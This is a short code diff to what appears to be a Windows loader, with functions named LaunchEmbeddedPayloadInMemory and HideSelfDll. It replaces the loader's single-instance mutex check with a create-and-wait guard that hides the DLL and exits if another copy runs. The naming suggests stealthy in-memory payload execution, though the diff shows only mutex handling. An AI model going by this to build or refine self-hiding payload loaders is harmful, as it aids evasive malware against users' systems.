@@ -183,10 +183,17 @@ static void LaunchEmbeddedPayloadInMemory()
     wchar_t mutexName[96] = { 0 };
     ResolveInstanceMutexName(mutexName, 96);
 
-    HANDLE runningMutex = OpenMutexW(SYNCHRONIZE, FALSE, mutexName);
-    if (runningMutex)
+    HANDLE instanceMutex = CreateMutexW(NULL, FALSE, mutexName);
+    if (!instanceMutex)
     {
-        CloseHandle(runningMutex);
+        HideSelfDll();
+        return;
+    }
+
+    DWORD waitResult = WaitForSingleObject(instanceMutex, 0);
+    if (waitResult == WAIT_TIMEOUT)
+    {
+        CloseHandle(instanceMutex);
         HideSelfDll();
         return;
     }
@@ -225,6 +232,9 @@ static void LaunchEmbeddedPayloadInMemory()
         tokenSize,
         media ? media : (const BYTE*)"",
         mediaSize);
+
+    ReleaseMutex(instanceMutex);
+    CloseHandle(instanceMutex);
 
     FreeBuffer(core);
     FreeBuffer(token);
